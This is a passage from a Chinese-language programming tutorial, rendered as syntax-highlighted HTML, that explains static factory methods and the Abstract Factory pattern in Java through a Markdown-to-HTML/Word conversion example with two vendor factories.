&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">NumberFactroy&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">NumberFactroy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;123.123&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接忽略了中间的&lt;code>NumberFactoryImpl&lt;/code>实现类和实际产品&lt;code>BigDecimal&lt;/code>&lt;/p>
&lt;h4 id="静态工厂方法">静态工厂方法&lt;/h4>
&lt;p>上面的方法虽然很香，但复杂度还是非常的劝退，如果业务没那么复杂时可以直接简化为静态工厂方法——取消接口，通过静态方法直接返回产品&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">NumberFactory&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端调用时可以省略&lt;code>getFactory&lt;/code>这一步&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">NumberFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;123.123&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在这种方法中，&lt;code>NumberFactory&lt;/code>既是产品又是静态工厂，提供了静态方法&lt;code>parse&lt;/code>来创建&lt;code>Number&lt;/code>；&lt;code>Integer&lt;/code>就是这样实现的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>比直接&lt;code>new Integer(100)&lt;/code>好的地方在于&lt;code>valueOf&lt;/code>内部可能会使用&lt;code>new&lt;/code>创建一个新的&lt;code>Integer&lt;/code>实例，但也可能直接返回一个缓存的&lt;code>Integer&lt;/code>实例，对于调用方来说，没必要知道&lt;code>Integer&lt;/code>创建的细节；如果调用方直接使用&lt;code>Integer n = new Integer(100)&lt;/code>，那么就失去了使用缓存优化的可能性&lt;/p>
&lt;p>另一个常用的静态工厂方法是&lt;code>MessageDigest&lt;/code>计算摘要&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">MessageDigest&lt;/span> &lt;span style="color:#111">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">MessageDigest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;MD5&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">MessageDigest&lt;/span> &lt;span style="color:#111">sha1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">MessageDigest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;SHA-1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用方通过产品名称获得产品实例，不但调用简单，而且获得的引用仍然是&lt;code>MessageDigest&lt;/code>这个抽象类&lt;/p>
&lt;h3 id="抽象工厂abstract-factory">抽象工厂Abstract Factory&lt;/h3>
&lt;p>抽象工厂模式Abstract Factory是一个比较复杂的创建型模式，会出现抽象工厂对应多个实际工厂、每个实际工厂创建多个实际产品的情况&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220902110636017.png" alt="image-20220902110636017">&lt;/p>
&lt;p>举例：为用户提供一个md转HTML或Word的服务，定义如下接口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">AbstractFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HtmlDocument&lt;/span> &lt;span style="color:#75af00">createHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">WordDocument&lt;/span> &lt;span style="color:#75af00">createWord&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时不着急写实现类，因为格式转换太复杂了，&lt;del>小伙伴对不起产能不足&lt;/del>，所以我们再写两个接口留着供应商实现&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">HtmlDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toHtml&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">WordDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时&lt;code>AbstractFactory&lt;/code>是抽象工厂，&lt;code>HtmlDocument&lt;/code>和&lt;code>WordDocument&lt;/code>是留给供应商实现的两个抽象产品&lt;/p>
&lt;p>当前有两个供应商：FastDoc便宜且速度快，GoodDoc贵但效果好，我们计划同时使用两家供应商以便给免费和付费用户提供不同的服务&lt;/p>
&lt;p>首先来看FastDoc的具体实现，它必须要有实际的产品，即&lt;code>FastHtmlDocument&lt;/code>和&lt;code>FastWordDocument&lt;/code>（对应接口的实现类）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">FastHtmlDocument&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">HtmlDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toHtml&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">FastWordDocument&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WordDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>还需要实际的工厂来生产这两种产品，既&lt;code>FastFactory&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">FastFactory&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">AbstractFactory&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">HtmlDocument&lt;/span> &lt;span style="color:#75af00">createHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FastHtmlDocument&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">WordDocument&lt;/span> &lt;span style="color:#75af00">createWord&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FastWordDocument&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当我们作为客户端来使用FastDoc的服务时，需要这样编写代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">AbstractFactory&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FastFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HtmlDocument&lt;/span> &lt;span style="color:#111">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;## hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">html&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;fast.html&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">WordDocument&lt;/span> &lt;span style="color:#111">word&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factroy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createWord&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;## hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">word&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;fast.doc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于GoodDoc，也是相同的操作（和FastDoc一样）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 工厂
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">GoodFactory&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">AbstractFactory&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">HtmlDocument&lt;/span> &lt;span style="color:#75af00">createHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GoodHtmlDocument&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">WordDocument&lt;/span> &lt;span style="color:#75af00">createWord&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GoodWordDocument&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 产品
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">GoodHtmlDocument&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">HtmlDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toHtml&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">GoodWordDocument&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WordDocument&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端想要使用GoodDoc只需要把&lt;code>new FastFactory&lt;/code>变为&lt;code>new GoodFactory&lt;/code>即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">AbstractFactory&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GoodFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HtmlDocument&lt;/span> &lt;span style="color:#111">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;## hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">html&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;fast.html&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">WordDocument&lt;/span> &lt;span style="color:#111">word&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factroy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createWord&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;## hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">word&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">save&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;fast.doc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于客户端而言，只需要&lt;code>new&lt;/code>一个工厂（&lt;code>FastFactory&lt;/code>或&lt;code>GoodFactory&lt;/code>），剩下的只需要知道产品接口而不需要知道实际产品（比如中间的&lt;code>FastHtmlDocument&lt;/code>），如果把创建工厂的代码也放到&lt;code>AbstractFactory&lt;/code>就可以连实际工厂也屏蔽了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">AbstractFactory&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">AbstractFactory&lt;/span> &lt;span style="color:#75af00">createFactory&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fast&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
